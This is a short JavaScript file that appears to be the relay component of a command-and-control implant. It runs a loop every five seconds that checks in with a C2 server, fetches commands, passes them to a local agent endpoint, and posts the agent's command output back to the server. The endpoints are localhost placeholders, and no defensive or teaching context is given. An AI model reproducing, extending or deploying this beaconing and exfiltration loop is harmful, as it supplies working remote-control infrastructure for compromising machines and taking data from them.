var agentName;
var url = "http://localhost:8080/"; // URL of the Remote Endpoint
var local_url = "http://127.0.0.1:8081/"; // URL of the Agent Local Endpoint


//Improvements : Check if the response for each of them is OK.

function DoCallback() {
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", url + "callback/" + agentName, false ); // false for synchronous request
    xmlHttp.send( null );
    return xmlHttp.responseText;
}

function GetCommands() {
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", url + "commands/" + agentName, false ); // false for synchronous request
    xmlHttp.send( null );
    return xmlHttp.responseText;
}

function SendCommands(){
    var data = new FormData();
    data.append("cmd", GetCommands());
    var xhr = new XMLHttpRequest();
    xhr.open("POST", local_url + "command/", false);
    xhr.send(data);
    console.log(xhr.responseText)
}

function SendResponse() {


// Gets the command data response from the Agent /data
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", local_url + "data/", false ); // false for synchronous request
    xmlHttp.send( null );
    data = xmlHttp.responseText;

    // Sends the command data response to the C2


    if(data != "[]" && data != "null"){
        var xhr = new XMLHttpRequest();
        var response_data = new FormData();
        response_data.append("data", data);
        xhr.open("POST", url + "data/" + agentName, false);
        xhr.send(response_data);
    }


}

function Start(agent_name){

    agentName = agent_name;
    DoCallback();
    SendCommands();
    SendResponse();
    setTimeout(Start, 5000,agent_name);
}
